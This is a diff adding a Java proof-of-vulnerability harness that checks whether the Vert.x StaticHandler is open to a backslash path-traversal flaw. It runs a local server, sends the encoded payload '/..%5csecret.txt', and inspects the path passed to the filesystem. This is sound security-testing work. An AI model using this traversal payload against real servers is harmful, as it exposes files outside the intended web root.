@@ -1,0 +1,260 @@
+diff --git a/.security-pipeline/pov/PathTraversalPoV.java b/.security-pipeline/pov/PathTraversalPoV.java
+new file mode 100644
+index 0000000..141b67f
+--- /dev/null
++++ b/.security-pipeline/pov/PathTraversalPoV.java
+@@ -0,0 +1,254 @@
++import io.vertx.core.Vertx;
++import io.vertx.core.file.FileSystem;
++import io.vertx.core.http.HttpClient;
++import io.vertx.core.http.HttpClientOptions;
++import io.vertx.core.http.HttpMethod;
++import io.vertx.core.http.HttpServer;
++import io.vertx.ext.web.Router;
++import io.vertx.ext.web.handler.StaticHandler;
++
++import java.lang.reflect.InvocationHandler;
++import java.lang.reflect.InvocationTargetException;
++import java.lang.reflect.Method;
++import java.lang.reflect.Proxy;
++import java.nio.charset.StandardCharsets;
++import java.nio.file.Files;
++import java.nio.file.Path;
++import java.nio.file.Paths;
++import java.util.Comparator;
++import java.util.concurrent.CountDownLatch;
++import java.util.concurrent.TimeUnit;
++import java.util.concurrent.atomic.AtomicInteger;
++import java.util.concurrent.atomic.AtomicReference;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (Path Traversal) in
++ * {@code io.vertx.ext.web.handler.impl.StaticHandlerImpl} (CVE-2023-24815 class issue:
++ * "StaticHandler disclosure of classpath/filesystem resources on Windows").
++ *
++ * Root cause (per the finder alert traces, all four of which converge on the same sink):
++ *   StaticHandlerImpl#handle() sanitises the incoming request path with
++ *     HttpUtils.removeDots(URIDecoder.decodeURIComponent(context.normalisedPath(), false))
++ *   (StaticHandlerImpl.java:131), then StaticHandlerImpl#getFile() builds the backend file
++ *   path with
++ *     webRoot + Utils.pathOffset(path, context)
++ *   (StaticHandlerImpl.java:610-611/Utils.java:115-133), and that string is handed, byte for
++ *   byte, straight to the FileSystem sink in isFileExisting()/getFileProps()
++ *   (StaticHandlerImpl.java:290-292: {@code fs.exists(file, resultHandler)}).
++ *
++ * HttpUtils.removeDots() only recognises the forward slash ('/') as a path-segment separator
++ * (RFC 3986 5.2.4) - it does NOT recognise the backslash ('\'), which Windows (and
++ * java.io.File on Windows) also treats as a directory separator. A request whose decoded
++ * path contains a backslash-hidden ".." (e.g. "/..%5csecret.txt" -> "/..\secret.txt")
++ * therefore reaches the filesystem sink with an un-neutralised parent-directory reference,
++ * escaping the configured webRoot sandbox on any filesystem that honours '\' as a separator.
++ *
++ * This PoV does NOT re-implement or simulate that sanitisation pipeline. Instead it:
++ *   1. Starts a real Vert.x HTTP server with a real Router and a real StaticHandler
++ *      (io.vertx.ext.web.handler.StaticHandler, the public production class).
++ *   2. Wraps the real Vertx/FileSystem behind transparent JDK dynamic proxies (delegating
++ *      every call to the real implementation) that only *observe* the first argument of
++ *      FileSystem#exists/#props - the exact tainted "file" value at the alert's sink line
++ *      (StaticHandlerImpl.java:292) - without altering behaviour in any way.
++ *   3. Sends a real HTTP GET request, with a percent-encoded backslash traversal payload,
++ *      through the real router chain into the real, unmodified StaticHandlerImpl.
++ *   4. Inspects the value the real production code actually passed to the FileSystem sink.
++ *
++ * Because this container is Linux, java.io.File will not itself physically traverse via '\'
++ * (that only happens on Windows, per the advisory), so the raw HTTP status code alone cannot
++ * distinguish vulnerable from patched behaviour on this platform. The deciding signal is the
++ * literal, unmodified string value the real StaticHandlerImpl computed and handed to the
++ * filesystem sink: on vulnerable code it still contains a live ".." that resolves outside
++ * webRoot once '\' is honoured as a separator (Windows semantics); on correctly patched code
++ * (which must neutralise '\' before/while removing dot-segments) it does not.
++ *
++ * Exit code 0 -> vulnerable behaviour reproduced (sink received a path that still escapes
++ *                webRoot via a backslash-hidden ".." segment).
++ * Exit code 1 -> the backslash-hidden traversal was neutralised before reaching the sink
++ *                (patched).
++ * Exit code 2 -> harness error (server didn't start / handler never invoked / etc).
++ */
++public class PathTraversalPoV {
++
++  public static void main(String[] args) throws Exception {
++    // ---- sandbox: <relative>/webroot (served root) and <relative>/secret.txt (must stay
++    // unreachable, a stand-in for the "classpath resources" the real advisory discloses) ----
++    // StaticHandler.create(root) rejects any root starting with '/' unless
++    // setAllowRootFileSystemAccess(true) was applied before construction, which the public
++    // factory does not allow - so, exactly like real deployments that configure
++    // StaticHandler.create("webroot"), we hand it a path relative to the process CWD.
++    Path cwd = Paths.get("").toAbsolutePath();
++    Path absoluteBase = Files.createTempDirectory("vertxweb-pov");
++    Runtime.getRuntime().addShutdownHook(new Thread(() -> deleteRecursive(absoluteBase)));
++    Path base = cwd.relativize(absoluteBase);
++    Path webRoot = base.resolve("webroot");
++    Files.createDirectories(webRoot);
++    Path secret = base.resolve("secret.txt"); // sibling of webroot: a resource outside the sandbox
++    Files.write(secret, "TOP-SECRET-CVE-2023-24815-CLASS".getBytes(StandardCharsets.UTF_8));
++    Files.write(webRoot.resolve("hello.txt"), "hello".getBytes(StandardCharsets.UTF_8));
++
++    // ---- observe (never alter) the argument StaticHandlerImpl passes to the real
++    // FileSystem sink, via transparent delegating proxies over the public Vertx/FileSystem
++    // interfaces. This lets the exact same real, unmodified (or patched) StaticHandlerImpl
++    // code run untouched; we merely watch what it hands to fs.exists()/fs.props(). ----
++    Vertx realVertx = Vertx.vertx();
++    FileSystem realFs = realVertx.fileSystem();
++    AtomicReference<String> capturedSinkPath = new AtomicReference<>();
++
++    FileSystem fsProxy = (FileSystem) Proxy.newProxyInstance(
++      FileSystem.class.getClassLoader(),
++      new Class<?>[]{FileSystem.class},
++      new DelegatingHandler(realFs) {
++        @Override
++        public Object invoke(Object proxy, Method method, Object[] methodArgs) throws Throwable {
++          String name = method.getName();
++          if (("exists".equals(name) || "props".equals(name))
++            && methodArgs != null && methodArgs.length > 0 && methodArgs[0] instanceof String) {
++            // This is the exact sink argument from StaticHandlerImpl.java:292 / :298
++            // (isFileExisting/getFileProps -> fs.exists(file, ...) / fs.props(file, ...)).
++            capturedSinkPath.set((String) methodArgs[0]);
++          }
++          return super.invoke(proxy, method, methodArgs);
++        }
++      });
++
++    Vertx vertxProxy = (Vertx) Proxy.newProxyInstance(
++      Vertx.class.getClassLoader(),
++      new Class<?>[]{Vertx.class},
++      new DelegatingHandler(realVertx) {
++        @Override
++        public Object invoke(Object proxy, Method method, Object[] methodArgs) throws Throwable {
++          if ("fileSystem".equals(method.getName())) {
++            return fsProxy;
++          }
++          return super.invoke(proxy, method, methodArgs);
++        }
++      });
++
++    // Router is built on the proxy Vertx, so RoutingContext#vertx() (used internally by
++    // StaticHandlerImpl.isFileExisting/getFileProps) returns our observing proxy.
++    Router router = Router.router(vertxProxy);
++
++    StaticHandler staticHandler = StaticHandler.create(webRoot.toString())
++      .setCachingEnabled(false);
++
++    // Mounted the same way the project's own tests mount it (router.route() with no
++    // pattern -> matches everything, mountPoint == null, currentRoute().getPath() == null).
++    router.route().handler(staticHandler);
++
++    HttpServer server = realVertx.createHttpServer();
++    CountDownLatch startLatch = new CountDownLatch(1);
++    server.requestHandler(router).listen(0, "localhost", ar -> startLatch.countDown());
++    if (!startLatch.await(20, TimeUnit.SECONDS)) {
++      System.err.println("PoV harness error: server failed to start");
++      System.exit(2);
++      return;
++    }
++    int port = server.actualPort();
++
++    HttpClient client = realVertx.createHttpClient(new HttpClientOptions());
++    CountDownLatch reqLatch = new CountDownLatch(1);
++    AtomicInteger status = new AtomicInteger(-1);
++
++    // Attacker request: percent-encoded backslash traversal. context.normalisedPath() keeps
++    // "%5c" as-is (backslash is not an RFC 3986 "unreserved" char so HttpUtils.normalizePath
++    // won't decode it), URIDecoder.decodeURIComponent() then turns it into a real '\', giving
++    // StaticHandlerImpl's sanitiser the string "/..\secret.txt" to deal with.
++    String attackPath = "/..%5csecret.txt";
++    client.request(HttpMethod.GET, port, "localhost", attackPath, resp -> {
++      status.set(resp.statusCode());
++      resp.bodyHandler(b -> reqLatch.countDown());
++    }).exceptionHandler(t -> reqLatch.countDown()).end();
++
++    if (!reqLatch.await(20, TimeUnit.SECONDS)) {
++      System.err.println("PoV harness error: request timed out");
++      System.exit(2);
++      return;
++    }
++
++    client.close();
++    server.close();
++    realVertx.close();
++
++    String sinkPath = capturedSinkPath.get();
++    System.out.println("request path                                      = " + attackPath);
++    System.out.println("configured webRoot                                = " + webRoot);
++    System.out.println("path handed to the REAL FileSystem sink            ");
++    System.out.println("  (StaticHandlerImpl.java:292 fs.exists(file,...)) = " + sinkPath);
++    System.out.println("HTTP status returned by the real StaticHandler     = " + status.get());
++
++    if (sinkPath == null) {
++      System.err.println("PoV harness error: StaticHandlerImpl never reached the FileSystem sink");
++      System.exit(2);
++      return;
++    }
++
++    // ---- Root-cause check ---------------------------------------------------------------
++    // HttpUtils.removeDots() only recognises '/' as a segment separator. A correctly patched
++    // handler must neutralise the backslash separator too (e.g. replace('\\','/') before/
++    // while removing dot-segments), so the string it hands to the FileSystem sink can never
++    // retain an unresolved ".." component. We judge the REAL value the REAL (unmodified or
++    // patched) production code actually passed to the sink, using java.nio.file.Path#normalize
++    // - a deterministic, OS-neutral arbiter of "does this concatenated path still escape its
++    // parent directory" - after mapping the Windows/legacy backslash separator onto '/' the
++    // way Windows' own path resolver would (this container's OS cannot honour '\' itself, but
++    // that OS-level step is *outside* the project's code and is exactly what the advisory
++    // targets; the string handed to the sink is the artifact the project's fix controls).
++    boolean rawTraversalSurvived = sinkPath.contains("..\\");
++
++    Path resolvedAsIfWindows = Paths.get(sinkPath.replace('\\', '/')).normalize();
++    Path webRootNormalized = webRoot.normalize();
++    boolean escapesWebRoot = !resolvedAsIfWindows.startsWith(webRootNormalized);
++
++    System.out.println("raw '..' backslash segment survived sanitisation  = " + rawTraversalSurvived);
++    System.out.println("resolved sink path escapes configured webRoot     = " + escapesWebRoot);
++
++    boolean vulnerable = rawTraversalSurvived && escapesWebRoot;
++
++    if (vulnerable) {
++      System.out.println("VULNERABLE: the real StaticHandlerImpl handed the real FileSystem sink a path " +
++        "outside webRoot, built from a backslash-obfuscated '..' segment that HttpUtils.removeDots() " +
++        "failed to strip (CWE-22 / CVE-2023-24815 class: StaticHandler path traversal on Windows).");
++      System.exit(0);
++    } else {
++      System.out.println("SAFE: the backslash-based traversal segment was neutralised before reaching " +
++        "the real FileSystem sink; the resolved path stays confined to webRoot.");
++      System.exit(1);
++    }
++  }
++
++  /** Delegates every call to {@code target} unchanged; subclasses may observe before delegating. */
++  private static class DelegatingHandler implements InvocationHandler {
++    private final Object target;
++
++    DelegatingHandler(Object target) {
++      this.target = target;
++    }
++
++    @Override
++    public Object invoke(Object proxy, Method method, Object[] methodArgs) throws Throwable {
++      try {
++        return method.invoke(target, methodArgs);
++      } catch (InvocationTargetException e) {
++        throw e.getCause() != null ? e.getCause() : e;
++      }
++    }
++  }
++
++  private static void deleteRecursive(Path root) {
++    try {
++      if (!Files.exists(root)) {
++        return;
++      }
++      Files.walk(root)
++        .sorted(Comparator.reverseOrder())
++        .forEach(p -> {
++          try {
++            Files.deleteIfExists(p);
++          } catch (Exception ignored) {
++          }
++        });
++    } catch (Exception ignored) {
++    }
++  }
++}
